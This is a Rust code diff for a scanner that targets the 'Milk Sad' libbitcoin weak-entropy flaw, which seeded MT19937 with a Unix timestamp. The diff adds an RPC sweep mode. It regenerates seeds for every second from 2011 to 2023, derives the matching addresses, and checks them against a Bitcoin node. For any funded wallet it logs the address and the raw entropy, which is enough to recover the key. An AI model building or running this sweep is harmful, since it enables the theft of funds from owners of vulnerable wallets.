@@ -13,22 +13,47 @@ use bitcoin::{Address, Network};
 use rand_mt::Mt19937GenRand32;
 #[cfg(feature = "gpu")]
 use std::str::FromStr;
-use tracing::{info, warn};
+use tracing::{info, warn, error};
+use bitcoincore_rpc::{Client, RpcApi, Auth};
 
-/// Libbitcoin "Milk Sad" Vulnerability (100% GPU)
-/// MT19937 seeded with unix timestamp (seconds)
-pub fn run() -> Result<()> {
-    info!("Milk Sad Vulnerability Scanner (100% GPU)");
-    info!("This scanner requires a target address. Use: milk-sad --target <address>");
-    info!("For address generation mode, use the original hybrid implementation.");
-
-    Ok(())
-}
-
-pub fn run_with_target(
-    target: String,
+/// Unified Milk Sad Scanner Entry Point
+pub fn run_scan(
+    target: Option<String>,
     start_ts_opt: Option<u32>,
     end_ts_opt: Option<u32>,
+    multipath: bool,
+    rpc_config: Option<(String, String, String)>,
+) -> Result<()> {
+    info!("Milk Sad Vulnerability Scanner (GPU-Accelerated)");
+    
+    // Time range: Default to 2011-2023
+    let start_ts = start_ts_opt.unwrap_or(1293840000u32); 
+    let end_ts = end_ts_opt.unwrap_or(1690848000u32);
+
+    // Setup RPC if config provided
+    let rpc_client = if let Some((url, user, pass)) = rpc_config {
+        info!("RPC Enabled: Connecting to {}...", url);
+        Some(Client::new(&url, Auth::UserPass(user, pass))?)
+    } else {
+        None
+    };
+
+    if target.is_none() && rpc_client.is_none() {
+        error!("Usage Error: You must provide EITHER a --target address OR --rpc-url/user/pass to scan for funds.");
+        return Err(anyhow::anyhow!("Missing target or RPC config"));
+    }
+
+    match target {
+        Some(t) => run_with_target(&t, start_ts, end_ts, multipath),
+        None => run_rpc_scan(start_ts, end_ts, multipath, rpc_client.unwrap())
+    }
+}
+
+/// Legacy Target Mode (Checks against specific address hash)
+fn run_with_target(
+    target: &str,
+    start_ts: u32,
+    end_ts: u32,
     multipath: bool,
 ) -> Result<()> {
     info!("Milk Sad Vulnerability Scanner (100% GPU)");
@@ -53,10 +78,6 @@ pub fn run_with_target(
     target_hash160.copy_from_slice(target_hash160_slice);
 
     info!("Target Hash160: {}", hex::encode(&target_hash160));
-
-    // Time range: Allow custom or default to 2011-2023
-    let start_ts = start_ts_opt.unwrap_or(1293840000u32); // 2011-01-01
-    let end_ts = end_ts_opt.unwrap_or(1690848000u32); // 2023-08-01
 
     info!(
         "Scanning timestamps {} to {} ({} seconds)...",
@@ -144,6 +165,57 @@ pub fn run_with_target(
         info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
         Ok(())
     }
+}
+
+/// RPC Scan Mode (Generates addresses and checks balance)
+/// Note: This is purely CPU based for now unless we implement bloom filter or fast RPC calls.
+/// Because RPC is network bound, GPU generation is overkill if we serialize every address.
+/// BUT: We can use GPU to generate seeds, then CPU to derive addresses and check.
+/// Actually, implementing purely on CPU for RPC mode is acceptable given RPC latency (~10ms per call).
+/// 10ms * 1M addresses = 10,000 seconds (3 hours). 
+fn run_rpc_scan(start_ts: u32, end_ts: u32, multipath: bool, rpc: Client) -> Result<()> {
+    info!("Mode: RPC Sweep (Checking balances for ALL derived addresses)");
+    info!("Scanning {} timestamps...", end_ts - start_ts);
+    
+    let _start_time = std::time::Instant::now();
+    let mut checked = 0;
+    
+    for t in start_ts..=end_ts {
+        let entropy = generate_milk_sad_entropy(t);
+        // Only check index 0 by default to save time, unless multipath
+        let limit = if multipath { 5 } else { 1 }; 
+        
+        for i in 0..limit {
+            let address_str = generate_address_from_entropy(&entropy, i);
+            if let Ok(address) = Address::from_str(&address_str) {
+                // Check balance
+                // assume_checked is risky if address is invalid, but we generated it.
+                // We use assume_checked() for bitcoincore-rpc compatibility? 
+                // bitcoincore_rpc expects Address type.
+                match rpc.get_received_by_address(&address.assume_checked(), Some(0)) {
+                    Ok(balance) => {
+                         if balance.to_sat() > 0 {
+                             warn!("\n💰 FUNDED WALLET FOUND!");
+                             warn!("Timestamp: {}", t);
+                             warn!("Address: {}", address_str);
+                             warn!("Total Received: {}", balance);
+                             warn!("Entropy: {}", hex::encode(&entropy));
+                         }
+                    }
+                    Err(_e) => {
+                        // Rate limit or error?
+                        // warn!("RPC Error: {}", e);
+                    }
+                }
+            }
+        }
+        checked += 1;
+        if checked % 100 == 0 {
+             // info!("Checked {} timestamps...", checked);
+        }
+    }
+    info!("RPC Scan complete.");
+    Ok(())
 }
 
 /// Generate 128-bit entropy using MT19937 with MSB extraction
